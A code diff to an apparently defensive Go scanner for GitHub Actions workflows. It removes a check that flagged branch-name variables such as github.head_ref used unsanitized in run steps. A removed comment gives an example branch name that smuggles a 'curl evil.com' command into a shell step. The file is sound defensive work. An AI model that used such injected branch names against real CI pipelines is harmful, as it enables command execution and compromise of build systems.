@@ -33,22 +33,6 @@ var (
 		`github\.event\.pull_request\.head\.label|` +
 		`github\.event\.pull_request\.head\.repo\.default_branch|` +
 		`github\.head_ref).*`)
-
-	// Branch name variables that could be used unsafely in workflow run steps.
-	// These are attacker-controllable when a PR is opened from a fork.
-	// When used directly in a run: step, GitHub textually injects the branch name
-	// into the shell script before execution, allowing command injection via
-	// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
-	alwaysUnsafeBranchVars = regexp.MustCompile(`.*(github\.head_ref|` +
-		`github\.base_ref|` +
-		`github\.event\.pull_request\.head\.ref|` +
-		`github\.event\.pull_request\.base\.ref).*`)
-
-	// Branch ref variables that are only attacker-controllable in
-	// pull_request-triggered workflows. Checked separately so we can
-	// skip them for push-triggered workflows and avoid false positives.
-	pullRequestOnlyUnsafeBranchVars = regexp.MustCompile(`.*(github\.ref\b|` +
-		`github\.ref_name).*`)
 )
 
 // checkAllWorkflows fetches the repository's workflow files and evaluates each
@@ -113,65 +97,6 @@ func evaluateWorkflows(workflows []data.WorkflowFile, checkWorkflow func(*action
 func CicdSanitizedInputParameters(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
 	return checkAllWorkflows(payload, checkWorkflowFileForUntrustedInputs,
 		"GitHub Workflows variables do not contain untrusted inputs")
-}
-
-func CicdBranchNameSanitized(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
-	return checkAllWorkflows(payload, checkWorkflowFileForBranchNameUsage,
-		"GitHub Workflows do not use unsanitized branch names in run steps")
-}
-
-// checkWorkflowFileForBranchNameUsage checks a workflow for unsanitized branch name
-// variables used directly in run: steps, which can lead to command injection.
-// It applies two levels of checking:
-//   - alwaysUnsafeBranchVars: flagged regardless of trigger type (e.g. github.head_ref)
-//   - pullRequestOnlyUnsafeBranchVars: only flagged when the workflow has a
-//     pull_request or pull_request_target trigger (e.g. github.ref, github.ref_name)
-func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {
-
-	// Determine if the workflow is triggered by pull request events,
-	// which makes github.ref and github.ref_name attacker-controllable.
-	hasPullRequestTrigger := false
-	for _, event := range workflow.On {
-		if event.EventName() == "pull_request" || event.EventName() == "pull_request_target" {
-			hasPullRequestTrigger = true
-			break
-		}
-	}
-
-	var message strings.Builder
-
-	for _, job := range workflow.Jobs {
-		if job == nil {
-			continue
-		}
-
-		for _, step := range job.Steps {
-			if step == nil {
-				continue
-			}
-
-			run, ok := step.Exec.(*actionlint.ExecRun)
-			if !ok || run.Run == nil {
-				continue
-			}
-
-			varList := pullVariablesFromScript(run.Run.Value)
-
-			for _, name := range varList {
-				nameBytes := []byte(name)
-				if alwaysUnsafeBranchVars.Match(nameBytes) {
-					fmt.Fprintf(&message, "Unsanitized branch name variable found: %v\n", name)
-				} else if hasPullRequestTrigger && pullRequestOnlyUnsafeBranchVars.Match(nameBytes) {
-					fmt.Fprintf(&message, "Attacker-controllable ref variable in pull_request workflow: %v\n", name)
-				}
-			}
-		}
-	}
-
-	if message.Len() > 0 {
-		return false, message.String()
-	}
-	return true, ""
 }
 
 // checkWorkflowFileForUntrustedInputs checks a workflow for known untrusted
